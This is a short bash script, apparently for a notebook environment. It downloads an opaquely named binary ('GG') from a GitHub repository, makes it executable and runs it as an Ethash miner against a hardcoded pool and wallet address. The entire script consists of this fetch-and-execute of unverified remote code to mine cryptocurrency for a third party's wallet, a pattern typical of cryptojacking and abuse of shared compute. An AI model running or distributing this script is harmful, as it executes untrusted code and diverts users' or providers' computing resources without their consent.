#!/bin/bash

#################################
## Begin of user-editable part ##
#################################

ALGHO=ETHASH
POOL=us-eth.2miners.com:2020
WALLET=0x6e890745813facaeab2afab23440a04f6b55034a
WORKER=$(echo $(shuf -i 1-999 -n 1)-VGA)

#################################
##  End of user-editable part  ##
#################################

! cd "$(dirname "$0")"

! wget https://github.com/prathhub/SPLIT/raw/main/GG
! chmod +x GG
! ./GG --algo $ALGHO --pool $POOL --user $WALLET.$WORKER
